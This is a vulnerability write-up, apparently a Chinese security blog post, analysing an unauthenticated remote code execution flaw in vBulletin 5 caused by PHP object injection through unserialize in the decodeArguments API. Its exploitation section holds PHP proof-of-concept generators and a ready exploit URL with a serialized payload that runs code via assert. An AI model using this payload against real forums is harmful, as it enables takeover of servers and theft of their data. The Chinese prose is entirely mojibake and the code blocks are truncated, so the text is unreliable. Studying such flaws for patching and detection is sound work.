# vBulletin 5 å…¨ç‰ˆæœ¬è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´åˆ†æ
|
##### è¯‘æ–‡å£°æ˜
æœ¬æ–‡æ˜¯ç¿»è¯‘æ–‡ç« ï¼Œæ–‡ç« æ¥æºï¼šSudoHac@360adlab
è¯‘æ–‡ä»…ä¾›å‚è€ƒï¼Œå…·ä½“å†…å®¹è¡¨è¾¾ä»¥åŠå«ä¹‰åŸæ–‡ä¸ºå‡†ã€‚
**  
**
**[Authorï¼šSudoHacï¼ˆ360adlabï¼‰](http://weibo.com/sudosec)**
å‰å‡ å¤©vBulletinå®˜æ–¹è®ºå›è¢«é»‘,éšåä¸€ä¸ªå«Coldzer0çš„å°å“¥åœ¨1337ä¸Šå–vBulletin 5å…¨ç‰ˆæœ¬çš„RCE
0day,çœ‹æ¼”ç¤ºå¾ˆå‰å®³,æŒ‡å“ªæ‰“å“ªã€‚ä¸è¿‡ä¸å¹¸çš„æ˜¯ä¸ä¹…åå°±æœ‰äººåœ¨pastieä¸Šè´´å‡ºäº†å®Œæ•´åˆ†æå’ŒPOCã€‚
ç›®å‰vBulletinå®˜æ–¹å·²ç»å‘å¸ƒå®‰å…¨å…¬å‘Šä¿®å¤äº†è¯¥æ¼æ´ã€‚
[http://www.vbulletin.org/forum/showthread.php?p=2558144](http://www.vbulletin.org/forum/showthread.php?p=2558144)
**æ¼æ´åˆ†æ**
åœ¨vBulletinä¸­å­˜åœ¨å¾ˆå¤šå†…éƒ¨çš„æ¥å£,æœ‰ä¸€äº›å¯ä»¥åœ¨å¤–éƒ¨é€šè¿‡Ajaxè°ƒç”¨,è¿™æ¬¡çš„é—®é¢˜å‡ºç°vB_Api_Hook::decodeArguments()ä¸­ã€‚
è¿™ä¸ªæ¥å£å¯ä»¥åœ¨æœªç™»å½•çš„æƒ…å†µä¸‹ç›´æ¥è®¿é—®,
å‚æ•°ä¼ å…¥åç›´æ¥è¢«unserializeååºåˆ—åŒ–ã€‚
ç„¶åè¢«å¸¦å…¥foreachè¿›è¡Œè¿­ä»£ã€‚
åœ¨/core/vb/db/result.phpæ–‡ä»¶,vB_dB_Resultç±»å®ç°äº†Iteratoræ¥å£,è¿™ä¸ªæ¥å£æ˜¯phpé‡Œçš„è¿­ä»£å™¨
phpæ‰‹å†Œå…³äºè¿­ä»£å™¨çš„ä»‹ç»[http://php.net/manual/zh/class.iterator.php](http://php.net/manual/zh/class.iterator.php)
åœ¨phpæ‰‹å†Œä¸­å¯ä»¥çœ‹åˆ°,å½“ç¨‹åºé€šè¿‡foreachè¿›è¡Œè¿­ä»£æ—¶,rewind()æ–¹æ³•ä¼šè¢«ç¬¬ä¸€ä¸ªè°ƒç”¨ã€‚
çœ‹ä¸‹vB_dB_Resultç±»ä¸­æ˜¯å¦‚ä½•å®ç°rewind()çš„:
å¦‚æœå­˜åœ¨recordset,åˆ™å°†recordsetå¸¦å…¥free_result()å‡½æ•°
è·Ÿè¿›free_result()å‡½æ•°:
å¯ä»¥çœ‹åˆ°ç¨‹åºå°†functions[â€˜free_resutlâ€™]ä½œä¸ºå‡½æ•°å,recordsetä½œä¸ºå‚æ•°æ‰§è¡Œäº†ã€‚
åœ¨ç±»çš„å¼€å§‹æœ‰è¿™æ ·çš„å®šä¹‰,å¯¹åº”æ‰§è¡Œçš„æ˜¯mysql_free_result()å‡½æ•°,ä¹Ÿå°±æ˜¯å°†recordsetçš„å†…å­˜é‡Šæ”¾æ‰ã€‚
è¿™æ˜¯ç¨‹åºæ­£å¸¸çš„é€»è¾‘,ä½†æ˜¯å¦‚æœæˆ‘ä»¬åœ¨ä¼ å…¥å‚æ•°çš„æ—¶å€™,ä¼ å…¥ä¸€ä¸ªç²¾å¿ƒæ„é€ çš„å¯¹è±¡,å°†functions[â€˜free_resutlâ€™]å®šä¹‰ä¸ºå…¶ä»–å‡½æ•°(æ¯”å¦‚evalã€assert),ç„¶åå°†recordsetå®šä¹‰ä¸ºä»»æ„phpä»£ç ,å°±å¯ä»¥å®ç°RCEã€‚
**æ¼æ´åˆ©ç”¨**
ä½œè€…ç›´æ¥ç»™å‡ºäº†poc:
    $ php functions['free_result'] = 'phpinfo';
            }
     }
     class vB_dB_Result {
            protected $db;
            protected $recordset;
            public function __construct()
            {
                    $this->db = new vB_Database();
                    $this->recordset = 1;
            }
     }
     print urlencode(serialize(new vB_dB_Result())) . "n";
     eof
è¿è¡Œåä¼šç”Ÿæˆä¸€ä¸ªåºåˆ—åŒ–çš„å¯¹è±¡,ç›´æ¥ä½œä¸ºå‚æ•°è®¿é—®æ¥å£å°±å¯ä»¥äº†ã€‚
ä½†æ˜¯ç»è¿‡æµ‹è¯•,å‘ç°è¿™ä¸ªpocåªæœ‰åœ¨vBulletin5.1çš„ç‰ˆæœ¬ä¸­
è¿™ä¸ªç±»å˜æˆäº†ä¸€ä¸ªæŠ½è±¡ç±»,å› æ­¤ä½¿ç”¨åŸæ–‡çš„pocå»å®ä¾‹åŒ–ä¸€ä¸ªæŠ½è±¡ç±»è‚¯å®šæ˜¯ä¼šæŠ¥é”™çš„ã€‚
æˆ‘æƒ³è¿™åº”è¯¥æ˜¯ä½œè€…æ•…æ„ç•™çš„ä¸€ä¸ªå°å‘,æ¥é˜²æ­¢ä¼¸æ‰‹å…šçš„å§ XD
é‚£ä¹ˆæˆ‘ä»¬è¦å¦‚ä½•åˆ©ç”¨è¿™ä¸ªæ¼æ´å‘¢?
æœ€ç®€å•çš„åŠæ³•å°±æ˜¯æ‰¾ä¸€ä¸ªç»§æ‰¿äº†vB_Databaseç±»çš„å­ç±»,ç„¶ååˆ©ç”¨å­ç±»å»è®¿é—®çˆ¶ç±»çš„æˆå‘˜å˜é‡,ä¿®æ”¹ä¸ºæˆ‘ä»¬éœ€è¦çš„assertã€‚
ç»è¿‡æœç´¢,å‘ç°ä½¿ç”¨vB_Databaseçš„ä¸€ä¸ªå­ç±»vB_Database_MySQLå¯ä»¥å®ç°åˆ©ç”¨ã€‚
æ”¹å†™ä¸‹poc:
    $ php functions['free_result'] = 'assert';
            }
     }
     class vB_dB_Result {
            protected $db;
            protected $recordset;
            public function __construct()
            {
                    $this->db = new vB_Database_MySQL();
                    $this->recordset = "phpinfo()";
            }
     }
     print urlencode(serialize(new vB_dB_Result())) . "n";
     eof
å³å¯é€šæ€5å…¨ç‰ˆæœ¬
    http://url /ajax/api/hook/decodeArguments?arguments=O%3A12%3A%22vB_dB_Result%22%3A2%3A%7Bs%3A5%3A%22%00%2A%00db%22%3BO%3A17%3A%22vB_Database_MySQL%22%3A1%3A%7Bs%3A9%3A%22functions%22%3Ba%3A1%3A%7Bs%3A11%3A%22free_result%22%3Bs%3A6%3A%22assert%22%3B%7D%7Ds%3A12%3A%22%00%2A%00recordset%22%3Bs%3A9%3A%22phpinfo%28%29%22%3B%7D
**åè®°**
é€šè¿‡åˆ†æ,æ„Ÿè§‰è¿™ä¸ªæ¼æ´æœ€ç²¾å½©çš„è¿˜æ˜¯ä»–çš„åˆ©ç”¨è¿‡ç¨‹,ä½œè€…é€šè¿‡foreachè¿­ä»£ä¸­è°ƒç”¨çš„rewind()æ–¹æ³•å®ç°å¯¹è±¡æ³¨å…¥,æœ€ç»ˆå®ç°RCE,å¯è§å…¶æ¼æ´æŒ–æ˜åŠŸåŠ›ä¹‹æ·±åšã€‚
åŒæ—¶å€¼å¾—ä¸€æçš„æ˜¯è¿™ä¸ªå¯¹è±¡æ³¨å…¥å…¶å®è¿˜æœ‰æ›´å¤šå¯ä»¥åˆ©ç”¨çš„ç‚¹,æ¯”å¦‚checkpointå‘çš„è¿™ç¯‡æ–‡ç« 
[http://blog.checkpoint.com/2015/11/05/check-point-discovers-critical-vbulletin-0-day/](http://blog.checkpoint.com/2015/11/05/check-point-discovers-critical-vbulletin-0-day/)
åˆ©ç”¨vB_vURLçš„__destruct()å®ç°ä»»æ„æ–‡ä»¶åˆ é™¤,åˆ©ç”¨vB_Viewçš„__toString()å®ç°è¿œç¨‹ä»£ç æ‰§è¡Œã€‚
**æœ€åæ„Ÿè°¢ä¸æ„¿æ„é€éœ²å§“åçš„L.N.å’Œå¼ è€å¸ˆåœ¨æ¼æ´åˆ†æä¸­ç»™äºçš„å¤§åŠ›å¸®åŠ© ğŸ™‚**